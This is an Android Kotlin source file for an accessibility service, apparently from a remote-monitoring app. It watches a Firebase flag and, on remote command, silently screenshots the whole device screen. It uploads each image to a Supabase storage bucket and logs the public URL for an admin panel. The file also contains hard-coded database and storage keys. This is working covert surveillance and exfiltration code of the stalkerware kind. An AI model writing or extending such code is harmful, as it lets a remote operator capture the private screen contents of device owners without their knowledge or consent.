package com.example.devsync

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException

class ScreenshotService : AccessibilityService() {

    companion object {
        const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "sb_publishable_v7x5HUzpIf3LNyTMGRcGFw_8g2QV3BY"
        const val BUCKET = "screenshots"
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }
    private val httpClient = OkHttpClient()
    private val handler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
        regRef.child("accessibility_granted").setValue(true)
        listenForScreenshotCommand()
    }

    private fun listenForScreenshotCommand() {
        database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                    database.child("take_screenshot").removeValue()
                    regRef.child("lastStatus").setValue("⏳ Taking screenshot...")
                    regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
                    takeScreenshot()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun takeScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            screenshotResult.hardwareBuffer, screenshotResult.colorSpace
                        )?.copy(Bitmap.Config.ARGB_8888, false)
                        screenshotResult.hardwareBuffer.close()
                        bitmap?.let { uploadToSupabase(it) }
                    }
                    override fun onFailure(errorCode: Int) {
                        regRef.child("lastStatus").setValue("❌ Screenshot failed: code $errorCode")
                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
                    }
                }
            )
        } else {
            regRef.child("lastStatus").setValue("❌ Screenshot requires Android 11+")
            regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
        }
    }

    private fun uploadToSupabase(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
                val bytes = stream.toByteArray()

                val timestamp = System.currentTimeMillis()
                val fileName = "${deviceId}_${timestamp}.jpg"
                val path = "storage/v1/object/$BUCKET/$fileName"

                val body = bytes.toRequestBody("image/jpeg".toMediaType())
                val request = Request.Builder()
                    .url("$SUPABASE_URL/$path")
                    .header("Authorization", "Bearer $SUPABASE_KEY")
                    .header("Content-Type", "image/jpeg")
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
                        // Save to Firebase so admin panel can show it
                        val screenshotRef = FirebaseDatabase.getInstance(DB_URL)
                            .getReference("screenshots").push()
                        screenshotRef.setValue(mapOf(
                            "deviceId" to deviceId,
                            "url" to publicUrl,
                            "timestamp" to timestamp
                        ))
                        regRef.child("lastStatus").setValue("📸 Screenshot uploaded")
                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
                    } else {
                        regRef.child("lastStatus").setValue("❌ Upload failed: ${response.code}")
                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
                    }
                }
            } catch (e: Exception) {
                regRef.child("lastStatus").setValue("❌ Upload error: ${e.message}")
                regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        regRef.child("accessibility_granted").setValue(false)
    }
}
